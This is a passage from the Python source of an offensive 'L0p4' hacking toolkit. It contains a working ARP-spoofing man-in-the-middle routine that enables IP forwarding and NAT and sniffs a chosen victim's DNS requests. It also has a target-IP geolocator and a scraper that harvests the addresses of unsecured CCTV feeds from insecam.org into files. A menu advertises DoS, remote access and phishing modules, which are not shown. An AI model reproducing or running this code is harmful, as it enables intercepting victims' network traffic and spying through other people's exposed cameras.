            if not target_ip or packet[IP].src == target_ip:
                try:
                    domain = packet[DNSQR].qname.decode('utf-8').strip('.')
                    main_domain = get_main_domain(domain)  
                    print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {main_domain}{Style.RESET_ALL}")  
                except Exception as e:
                    print(f"{Fore.RED}[-] Error decoding DNS request: {e}{Style.RESET_ALL}")
    sniff(filter=f"udp port 53 and src {target_ip}", iface=iface, prn=process_packet, store=False)

def web_spoof():
    try:
        iface = input(f"\n{Fore.YELLOW} Interface (e.g., wlan0): {Style.RESET_ALL}")
        victim_ip = input(f"{Fore.YELLOW} Victim IP > {Style.RESET_ALL}")
        gateway_ip = input(f"{Fore.YELLOW} Gateway IP > {Style.RESET_ALL}")

        enable_promiscuous(iface)

        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
        os.system(f"sudo iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")

        spoof_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, iface), daemon=True)
        spoof_thread.start()

        print(f"{Fore.CYAN}\n[*] Sniffing DNS traffic from {victim_ip} on {iface}... Press Ctrl+C to stop.{Style.RESET_ALL}")
        try:
            dns_sniffer(iface, victim_ip)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Sniffing stopped.{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user.{Style.RESET_ALL}")




def get_public_ip():
    r = requests.get("https://api.ipify.org")
    return r.text


def ip_geo():
    try:
        menu_intro("IP GEOLOCATOR")

        public_ip = get_public_ip()
        print(f" Your ip address: {Fore.RED}{public_ip}{Style.RESET_ALL}")
        print(f'\n Type "{Fore.RED}0{Style.RESET_ALL}" for return back')

        target_ip = input(f"{Fore.RED} TARGET IP: {Style.RESET_ALL}")

        if target_ip == "0":
            main()
        
        request_url = 'https://geolocation-db.com/jsonp/' + target_ip
        response = requests.get(request_url)
        result = response.content.decode()
        result = result.split("(")[1].strip(")")
        result = json.loads(result)

        print("\n Geolocation Information:")
        print(f" Country Code: {Fore.YELLOW}{result['country_code']}{Style.RESET_ALL}")
        print(f" Country Name: {Fore.YELLOW}{result['country_name']}{Style.RESET_ALL}")
        print(f" City: {Fore.YELLOW}{result['city']}{Style.RESET_ALL}")
        print(f" Postal Code: {Fore.RED}{result['postal']}{Style.RESET_ALL}")
        print(f" Latitude: {Fore.CYAN}{result['latitude']}{Style.RESET_ALL}")
        print(f" Longitude: {Fore.CYAN}{result['longitude']}{Style.RESET_ALL}")
        print(f" IPv4 Address: {Fore.GREEN}{result['IPv4']}{Style.RESET_ALL}")
        print(f" State: {Fore.GREEN}{result['state']}{Style.RESET_ALL}")

        back = input(f"\n{Fore.RED} [❔] Back Y/N: {Style.RESET_ALL}")

        if back.lower() == "y":
            main()
        elif back.lower() == "n":
            sys.exit()
        else:
            print("Option Not Valid...")
    except KeyboardInterrupt:
        close_program()


def typewriter(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()



def banner():
    clear()
    print("\033[1;32m")
    print(" ▄████▄   ▄████▄  ▄▄▄█████▓ ██▒   █▓")
    print("▒██▀ ▀█  ▒██▀ ▀█  ▓  ██▒ ▓▒▓██░   █▒")
    print("▒▓█    ▄ ▒▓█    ▄ ▒ ▓██░ ▒░ ▓██  █▒░")
    print("▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒░ ▓██▓ ░   ▒██ █░░")
    print("▒ ▓███▀ ░▒ ▓███▀ ░  ▒██▒ ░    ▒▀█░  ")
    print("░ ░▒ ▒  ░░ ░▒ ▒  ░  ▒ ░░      ░ ▐░  ")
    print("░  ▒     ░  ▒       ░       ░ ░░    ")
    print("░        ░          ░           ░░  ")
    print("░ ░      ░ ░                     ░  ")
    print("░        ░                      ░   ")
    print("         \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n")
    typewriter("\033[1;36m[~] Initializing access to unsecured CCTV feeds...\033[0m", 0.03)

def CCTV():
    try:
        banner()
        url = "http://www.insecam.org/en/jsoncountries/"
        headers = CaseInsensitiveDict()
        headers["Accept"] = "*/*"
        headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64)"

        country = None
        try:
            typewriter("\033[1;34m[+] Retrieving country codes...\033[0m", 0.02)
            resp = requests.get(url, headers=headers)

            try:
                data = resp.json()
                countries = data.get('countries', {})
            except Exception:
                print("\033[1;33m[!] Warning: Could not parse JSON. Falling back to legacy mode...\033[0m")
                countries = {}

            if not countries:
                print("\033[1;33m[!] Could not load country list. Enter code manually.\033[0m")
            else:
                print("\n\033[1;32m=== Available Country Codes ===\033[0m")
                for key, value in countries.items():
                    print(f'\033[1;36mCode: ({key}) - {value["country"]} ({value["count"]})\033[0m')
                print(f"\n{Fore.CYAN}[{Fore.RED}0{Fore.CYAN}] {Fore.LIGHTRED_EX}Menu                                      {Fore.GREEN}")

            print("")
            country = input("\033[1;33m[?] Enter country code (e.g. JP, RU, US): \033[0m").strip().upper()

            if country == "0": main()

            typewriter(f"\033[1;34m[+] Scanning feeds in region: {country}...\033[0m", 0.03)
            res = requests.get(f"http://www.insecam.org/en/bycountry/{country}", headers=headers)
            last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)
            last_page = int(last_page[0]) if last_page else 1


            os.makedirs("cams", exist_ok=True)
            with open(f'cams/{country}.txt', 'w') as f:
                for page in range(last_page):
                    res = requests.get(
                        f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                        headers=headers
                    )
                    find_ip = re.findall(r"http://\d+\.\d+\.\d+\.\d+:\d+", res.text)
                    for ip in find_ip:
                        print(f"\033[1;31m[+] Found cam: {ip}\033[0m")
                        f.write(f'{ip}\n')
                        time.sleep(0.05)

        except Exception as e:
            print(f"\033[1;31m[!] Error during execution: {e}\033[0m")

        finally:
            if country:
                print(f"\n\033[1;32m[✓] Feeds saved to file: \033[1;37m{country}.txt\033[0m")
            else:
                print("\033[1;33m[~] No feeds saved due to earlier error.\033[0m")
            print("\033[1;30m[>] Exiting session...\033[0m")
            time.sleep(1)
            exit()
    except KeyboardInterrupt:
        main()



def update_lopa_toolkit():
    text_animation(f"\n{Fore.YELLOW}[+] Starting Upgrade...{Style.RESET_ALL}", 0.02)
    try:
        subprocess.run("git stash && git pull", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        main()
    except subprocess.CalledProcessError:
        text_animation(f"\n{Fore.RED}[-] Error During The Update!...{Style.RESET_ALL}\n", 0.02)


def main():
    try:
        if os.name == "nt":
            windows()
            
        clear()
        text_animation(title, 0.0005)

        text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n{Style.RESET_ALL}", 0.0005)

        menu = f"""
            {Fore.GREEN}{Style.BRIGHT}┌{'─'*50}┐
            │{Fore.MAGENTA}{Style.BRIGHT}          L0p4 TOOLKIT - MAIN MENU           {Fore.GREEN}     │
            ├{'─'*50}┤
            │ {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Web Hacking                            {Fore.GREEN}      │
            │ {Fore.CYAN}[{Fore.WHITE}2{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Network Scanner                        {Fore.GREEN}      │
            │ {Fore.CYAN}[{Fore.WHITE}3{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Remote Access                          {Fore.GREEN}      │
            │ {Fore.CYAN}[{Fore.WHITE}4{Fore.CYAN}] {Fore.LIGHTGREEN_EX}DoS Attack                              {Fore.GREEN}     │
            │ {Fore.CYAN}[{Fore.WHITE}5{Fore.CYAN}] {Fore.LIGHTGREEN_EX}IP Geolocation                         {Fore.GREEN}      │
            │ {Fore.CYAN}[{Fore.WHITE}6{Fore.CYAN}] {Fore.LIGHTGREEN_EX}CCTV Cam's                              {Fore.GREEN}     │
            │ {Fore.CYAN}[{Fore.WHITE}7{Fore.CYAN}] {Fore.LIGHTGREEN_EX}OSINT Tools                             {Fore.GREEN}     │
            │ {Fore.CYAN}[{Fore.WHITE}8{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Phishing Kit                            {Fore.GREEN}     │
            ├{'─'*50}┤
            │ {Fore.CYAN}[{Fore.RED}0{Fore.CYAN}] {Fore.LIGHTRED_EX}Exit                                      {Fore.GREEN}   │
            │ {Fore.CYAN}[{Fore.YELLOW}99{Fore.CYAN}] {Fore.YELLOW}Update L0p4 Toolkit                        {Fore.GREEN} │
            └{'─'*50}┘
        """
        print(menu)
        s = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")

        match s:
            case "1":
                web_hacking()
            case "2":
                network()
            case "3":
                remote_access()
            case "4":
                dos()
            case "5":
                ip_geo()
            case "6":
                CCTV()
            case "7":
                osint()
            case "8":
                phishing()
            case "99":
                update_lopa_toolkit()
            case "0":
                close_program()
            case _:
                print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")
                main()

    except KeyboardInterrupt:
        close_program()


if __name__ == '__main__':
    main()  
